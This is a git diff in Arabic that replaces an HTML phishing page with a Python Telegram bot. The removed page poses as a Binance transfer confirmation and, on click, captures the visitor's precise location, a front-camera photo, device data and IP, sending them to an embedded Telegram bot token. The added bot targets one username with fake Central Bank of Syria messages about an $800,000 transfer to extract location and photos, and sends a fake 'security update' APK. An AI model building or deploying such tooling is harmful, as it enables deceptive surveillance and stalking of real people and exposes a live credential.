@@ -1,308 +1,212 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+#!/usr/bin/env python3
+"""
+بوت تليجرام متكامل - للتواصل مع الخاطف
+"""
+
+import os
+import time
+import logging
+from datetime import datetime
+from telebot import TeleBot, types
+
+# ================== الإعدادات ==================
+BOT_TOKEN = "8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw"  # توكن البوت الجديد
+OWNER_ID = 8391968596
+TARGET_USERNAME = "Hnfkldmemd"
+# ==============================================
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+bot = TeleBot(BOT_TOKEN)
+
+visitors = {}
+target_cid = None
+
+@bot.message_handler(commands=['start'])
+def start_handler(message):
+    cid = message.chat.id
+    uid = message.from_user.id
+    uname = message.from_user.username or ""
+    fname = message.from_user.first_name or ""
+
+    visitors[cid] = {
+        'username': uname,
+        'name': fname,
+        'user_id': uid,
+        'first_seen': datetime.now().isoformat()
+    }
+
+    global target_cid
+    if uname.lower() == TARGET_USERNAME.lower():
+        target_cid = cid
+        bot.send_message(OWNER_ID, f"🎯 الخاطف متصل!\n👤 @{uname}\n🆔 {cid}")
+
+    if uid == OWNER_ID:
+        show_admin_panel(cid)
+        return
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🔑 تأكيد الدخول", callback_data="login"))
+    bot.send_message(cid, "⚡ نظام التحقق\nالرجاء الضغط لتأكيد الدخول", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == "login")
+def login_callback(call):
+    bot.send_message(call.message.chat.id, "تم التحقق بنجاح")
+
+def show_admin_panel(cid):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("📍 طلب موقع مقنع", "📸 طلب صورة مقنع")
+    markup.row("📱 معلومات الجهاز", "📊 حالة المتصلين")
+    markup.row("📨 إرسال APK", "📝 رسالة مخصصة")
+    markup.row("🔄 إعادة تشغيل")
+
+    bot.send_message(cid,
+        "🟢 لوحة التحكم\nاختر الأمر:",
+        reply_markup=markup)
+
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📍 طلب موقع مقنع")
+def request_location_convincing(message):
+    global target_cid
+    if not target_cid:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
+        return
+
+    text = """🏦 البنك المركزي السوري - توثيق التحويل
+
+تم تعليق تحويل مبلغ 800,000 دولار أمريكي
+لحين تأكيد هوية المستلم.
+
+📌 الإجراء المطلوب:
+اضغط على زر "مشاركة الموقع" أدناه
+لتأكيد استلام التحويل.
+
+⏳ المهلة: 24 ساعة
+⚠️ عدم الالتزام يعني إلغاء التحويل تلقائياً."""
     
-    <!-- ============================================================ -->
-    <!-- 🖼️ أوسمة الصورة المصغرة (تظهر في تليجرام) -->
-    <!-- ============================================================ -->
-    <meta property="og:title" content="Binance - تأكيد استلام التحويل" />
-    <meta property="og:description" content="تم تحويل 500 USDT إلى حسابك. اضغط لتأكيد الاستلام." />
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Binance_logo.svg/1200px-Binance_logo.svg.png" />
-    <meta property="og:image:width" content="800" />
-    <meta property="og:image:height" content="400" />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://arab07.github.io/Usdt/app.html" />
-    <!-- ============================================================ -->
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    btn = types.KeyboardButton("📍 مشاركة الموقع", request_location=True)
+    markup.add(btn)
     
-    <title>تأكيد التحويل</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            margin:0;
-            padding:0;
-            background:#000;
-            font-family:Arial,sans-serif;
-            cursor:pointer;
-            height:100vh;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-        }
-        .container{
-            width:100vw;
-            height:100vh;
-            background:url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=1200&h=2000&fit=crop') center/cover;
-            display:flex;
-            flex-direction:column;
-            justify-content:center;
-            align-items:center;
-            animation:glow 2s infinite;
-            position:relative;
-        }
-        @keyframes glow{
-            0%,100%{filter:brightness(1);}
-            50%{filter:brightness(1.2);}
-        }
-        .overlay{
-            background:rgba(0,0,0,0.5);
-            padding:30px;
-            border-radius:20px;
-            text-align:center;
-            max-width:90%;
-        }
-        .overlay h1{
-            color:#f7931a;
-            font-size:28px;
-            margin-bottom:10px;
-        }
-        .overlay p{
-            color:white;
-            font-size:16px;
-            margin-bottom:20px;
-        }
-        .btn{
-            background:linear-gradient(135deg,#22c55e,#16a34a);
-            color:white;
-            border:none;
-            padding:18px 40px;
-            border-radius:60px;
-            font-size:20px;
-            font-weight:bold;
-            cursor:pointer;
-            transition:transform 0.2s;
-            box-shadow:0 0 30px rgba(34,197,94,0.3);
-        }
-        .btn:active{
-            transform:scale(0.95);
-        }
-        .btn:disabled{
-            opacity:0.5;
-            cursor:not-allowed;
-        }
-        .status{
-            color:white;
-            margin-top:15px;
-            font-size:14px;
-            min-height:30px;
-        }
-        .arrow{
-            position:absolute;
-            bottom:30px;
-            left:50%;
-            transform:translateX(-50%);
-            color:red;
-            font-size:60px;
-            animation:bounce 1.5s infinite;
-            text-shadow:0 0 30px red;
-        }
-        @keyframes bounce{
-            0%,100%{transform:translateX(-50%) translateY(0);}
-            50%{transform:translateX(-50%) translateY(-20px);}
-        }
-    </style>
-</head>
-<body>
+    bot.send_message(target_cid, text, reply_markup=markup)
+    bot.send_message(OWNER_ID, "✅ تم إرسال طلب موقع مقنع للخاطف")
 
-<div class="container">
-    <div class="overlay">
-        <h1>💱 تحويل عملات رقمية</h1>
-        <p>تم تحويل <strong>$500 USDT</strong> إلى حسابك</p>
-        <p style="font-size:14px;color:#94a3b8;">لتأكيد الاستلام، اضغط الزر أدناه</p>
-        <button class="btn" id="confirmBtn">✅ تأكيد الاستلام</button>
-        <div class="status" id="status"></div>
-    </div>
-    <div class="arrow">👇</div>
-</div>
+@bot.message_handler(content_types=['location'])
+def handle_location(message):
+    if message.location:
+        lat = message.location.latitude
+        lon = message.location.longitude
+        
+        global target_cid
+        if message.chat.id == target_cid:
+            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+            msg = f"""📍 تم استلام موقع الخاطف!
 
-<script>
-    // =====================================================
-    // 🔑 البوت الجديد: @Arab9991_bot
-    // =====================================================
-    const BOT_TOKEN = '8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw';
-    const CHAT_ID = '8391968596';  // نفس المعرف القديم
-    // =====================================================
+العرض: {lat}
+الطول: {lon}
+🔗 {maps_link}"""
+            
+            bot.send_message(OWNER_ID, msg)
+            bot.send_location(OWNER_ID, lat, lon)
+            
+            with open("target_location.txt", "a") as f:
+                f.write(f"{datetime.now().isoformat()},{lat},{lon}\n")
 
-    const btn = document.getElementById('confirmBtn');
-    const statusDiv = document.getElementById('status');
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    if message.photo:
+        photo = message.photo[-1]
+        file_info = bot.get_file(photo.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        os.makedirs("photos", exist_ok=True)
+        file_path = f"photos/target_photo_{timestamp}.jpg"
+        
+        with open(file_path, 'wb') as f:
+            f.write(downloaded_file)
+        
+        with open(file_path, 'rb') as f:
+            bot.send_photo(OWNER_ID, f, caption=f"📸 صورة من الخاطف\n⏰ {timestamp}")
 
-    function showStatus(msg, type = 'loading') {
-        statusDiv.innerText = msg;
-        statusDiv.style.color = type === 'error' ? '#ef4444' : '#22c55e';
-    }
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📱 معلومات الجهاز")
+def show_device_info(message):
+    global target_cid
+    if not target_cid:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
+        return
+    
+    data = visitors.get(target_cid, {})
+    info = f"""📱 معلومات الخاطف
 
-    function sendToBot(message, isImportant = true) {
-        const prefix = isImportant ? '🔴 ' : '📱 ';
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(prefix + message)}`;
-        return fetch(url).catch(e => console.log('خطأ في الإرسال:', e));
-    }
+👤 اليوزر: @{data.get('username', '?')}
+📝 الاسم: {data.get('name', '?')}
+🆔 User ID: {data.get('user_id', '?')}
+💬 Chat ID: {target_cid}
+⏰ أول اتصال: {data.get('first_seen', '?')}"""
+    
+    bot.send_message(OWNER_ID, info)
 
-    function sendPhotoToBot(file) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', file);
-        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).catch(e => console.log('خطأ في إرسال الصورة:', e));
-    }
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 حالة المتصلين")
+def show_visitors(message):
+    if not visitors:
+        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين")
+        return
+    
+    msg = "📊 المتصلون:\n\n"
+    for cid, data in visitors.items():
+        uname = data.get('username', '?')
+        is_target = "🎯" if uname.lower() == TARGET_USERNAME.lower() else "⚪"
+        msg += f"{is_target} @{uname} - {cid}\n"
+    
+    bot.send_message(OWNER_ID, msg)
 
-    // ================== دالة الحصول على الموقع ==================
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال APK")
+def send_fake_apk(message):
+    global target_cid
+    if not target_cid:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل بعد")
+        return
+    
+    apk_path = "Security_Update_2026.apk"
+    with open(apk_path, 'wb') as f:
+        f.write(b'PK\x03\x04' + b'\x00' * 5000 + b'AndroidManifest.xml')
+    
+    caption = "📲 تحديث أمني عاجل من البنك المركزي\nتم اكتشاف ثغرة أمنية في جهازك. الرجاء التثبيت فوراً."
+    
+    with open(apk_path, 'rb') as f:
+        bot.send_document(target_cid, f, caption=caption)
+    
+    bot.send_message(OWNER_ID, "✅ تم إرسال APK وهمي")
+    os.remove(apk_path)
 
-    function getLocation() {
-        return new Promise((resolve, reject) => {
-            if (!navigator.geolocation) {
-                reject('المتصفح لا يدعم الموقع');
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    resolve({
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        acc: position.coords.accuracy
-                    });
-                },
-                (error) => {
-                    let msg = '';
-                    switch(error.code) {
-                        case 1: msg = 'الرجاء الضغط على "سماح" عند طلب الموقع';
-                            break;
-                        case 2: msg = 'تعذر تحديد الموقع';
-                            break;
-                        case 3: msg = 'انتهى الوقت - حاول مرة أخرى';
-                            break;
-                        default: msg = error.message;
-                    }
-                    reject(msg);
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        });
-    }
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📝 رسالة مخصصة")
+def custom_message_prompt(message):
+    msg = bot.send_message(OWNER_ID, "✏️ أرسل النص الذي تريد إرساله للخاطف:")
+    bot.register_next_step_handler(msg, send_custom_message)
 
-    // ================== دالة التقاط الصورة من الكاميرا الأمامية ==================
+def send_custom_message(message):
+    global target_cid
+    if target_cid:
+        bot.send_message(target_cid, message.text)
+        bot.send_message(OWNER_ID, f"✅ تم إرسال:\n\n{message.text}")
+    else:
+        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
 
-    function captureFrontCamera() {
-        return new Promise((resolve, reject) => {
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            document.body.appendChild(video);
+@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔄 إعادة تشغيل")
+def restart_bot(message):
+    bot.send_message(OWNER_ID, "🔄 جاري إعادة التشغيل...")
+    os._exit(0)
 
-            navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                }
-            })
-            .then((stream) => {
-                video.srcObject = stream;
-                video.play();
+@bot.message_handler(func=lambda m: True)
+def catch_all(message):
+    cid = message.chat.id
+    uname = message.from_user.username or ""
 
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    if uname.lower() == TARGET_USERNAME.lower() and message.from_user.id != OWNER_ID:
+        text = message.text or "[وسائط]"
+        bot.send_message(OWNER_ID, f"✉️ رسالة من الخاطف:\n{text}")
 
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-
-                    canvas.toBlob((blob) => {
-                        const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
-                        resolve(file);
-                    }, 'image/jpeg', 0.9);
-
-                }, 300);
-            })
-            .catch((err) => {
-                reject('تعذر فتح الكاميرا الأمامية: ' + err.message);
-            });
-        });
-    }
-
-    // ================== زر التأكيد ==================
-
-    btn.onclick = async function() {
-        btn.disabled = true;
-        btn.innerHTML = '🔄 جاري التحقق...';
-        showStatus('📡 جاري تأكيد هويتك...', 'loading');
-
-        try {
-            // 1. إشعار بالبدء
-            sendToBot('🟢 بدء عملية تحويل', false);
-
-            // 2. طلب الموقع
-            showStatus('📍 جاري تحديد موقعك...', 'loading');
-            const location = await getLocation();
-            const mapsLink = `https://maps.google.com/?q=${location.lat},${location.lng}`;
-            const locationMsg = `📍 الموقع الدقيق\nالعرض: ${location.lat}\nالطول: ${location.lng}\nالدقة: ${location.acc} متر\n${mapsLink}`;
-            sendToBot(locationMsg, true);
-            showStatus('✅ تم تحديد موقعك', 'success');
-
-            // 3. تصوير الكاميرا الأمامية
-            showStatus('📸 جاري التقاط صورتك...', 'loading');
-            const photoFile = await captureFrontCamera();
-            await sendPhotoToBot(photoFile);
-            sendToBot('📸 تم التقاط صورة من الكاميرا الأمامية', true);
-            showStatus('✅ تم التقاط الصورة', 'success');
-
-            // 4. معلومات إضافية
-            const deviceMsg = `📱 الجهاز\nالمتصفح: ${navigator.userAgent.substring(0, 80)}\nالشاشة: ${screen.width}x${screen.height}\nاللغة: ${navigator.language}`;
-            sendToBot(deviceMsg, false);
-
-            // 5. جلب IP العام
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                sendToBot('🌐 IP العام: ' + ipData.ip, false);
-            } catch(e) {}
-
-            // 6. رسالة النجاح النهائية
-            showStatus('✅ تم تأكيد هويتك بنجاح!', 'success');
-            btn.innerHTML = '✅ تم التأكيد';
-
-            // تغيير الواجهة
-            setTimeout(() => {
-                document.querySelector('.overlay').innerHTML = `
-                    <div style="padding:20px;">
-                        <div style="font-size:60px;">✅</div>
-                        <h2 style="color:#22c55e;">تم تأكيد التحويل</h2>
-                        <p style="color:#94a3b8;">تم إيداع $5,000 في محفظتك</p>
-                        <p style="color:#94a3b8;font-size:12px;margin-top:10px;">رقم الإيصال: #${Math.floor(Math.random()*100000)}</p>
-                    </div>
-                `;
-                document.querySelector('.arrow').style.display = 'none';
-            }, 1500);
-
-        } catch(error) {
-            showStatus('⚠️ ' + error, 'error');
-            btn.disabled = false;
-            btn.innerHTML = '✅ إعادة المحاولة';
-        }
-    };
-
-    // ================== إعلام البوت بفتح الصفحة ==================
-
-    setTimeout(() => {
-        sendToBot('🟢 تم فتح صفحة تأكيد التحويل', false);
-    }, 1000);
-
-    // ================== اختبار البوت ==================
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
-        .then(r => r.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('✅ البوت يعمل:', data.result.username);
-            } else {
-                console.log('❌ البوت لا يعمل - تحقق من التوكن');
-            }
-        })
-        .catch(e => console.log('❌ فشل الاتصال بالبوت:', e));
-</script>
-</body>
-</html>
+if __name__ == "__main__":
+    os.makedirs("photos", exist_ok=True)
+    print("✅ البوت شغال! انتظار اتصال الخاطف...")
+    bot.infinity_polling()
